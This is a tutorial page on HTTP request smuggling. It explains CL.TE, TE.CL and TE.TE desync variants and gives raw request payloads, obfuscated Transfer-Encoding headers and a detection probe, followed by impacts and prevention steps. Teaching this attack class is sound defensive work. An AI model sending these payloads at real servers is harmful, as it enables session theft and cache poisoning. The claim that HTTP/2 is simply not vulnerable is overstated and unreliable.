# HTTP Request Smuggling

HTTP request smuggling exploits differences in how front-end (reverse proxy, load balancer, CDN) and back-end servers parse HTTP requests, allowing an attacker to "smuggle" a request through the front-end to the back-end.

## How It Works

The front-end and back-end disagree on request boundaries. When one ends a request before the other, the remaining bytes are treated as the start of the next request.

## Attack Types

### CL.TE (Content-Length vs Transfer-Encoding)
Front-end uses Content-Length, back-end uses Transfer-Encoding.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding vs Content-Length)
Front-end uses Transfer-Encoding, back-end uses Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

### TE.TE (Transfer-Encoding obfuscation)
Both use Transfer-Encoding, but one can be tricked.

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
```

## Detection

Send a smuggled prefix and observe if the next request is corrupted:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the next request becomes "GPOST / HTTP/1.1 404", the endpoint is vulnerable.

### Automated Detection
- **Burp Suite** — HTTP Request Smuggler extension
- **Smuggler** — Python tool by defparam
- **Nuclei** — Smuggling templates

## Impact

- **Request hijacking** — Steal other users' requests
- **Cache poisoning** — Poison CDN/proxy cache to serve malicious content
- **Authentication bypass** — Access restricted endpoints
- **WAF bypass** — Smuggled requests skip front-end inspection
- **Session hijacking** — Steal cookies from other users' requests

## Prevention

1. **Use HTTP/2** — Not vulnerable to smuggling (binary framing)
2. **Front-end and back-end consistency** — Use same parser
3. **Reject ambiguous requests** — Drop requests with conflicting CL/TE
4. **Normalize Transfer-Encoding** — Reject obfuscated TE headers
5. **Upgrade web servers** — Most recent patches fix known issues

---

> **Next Section**: [Tools](../04-Tools/01-recon-tools.md)
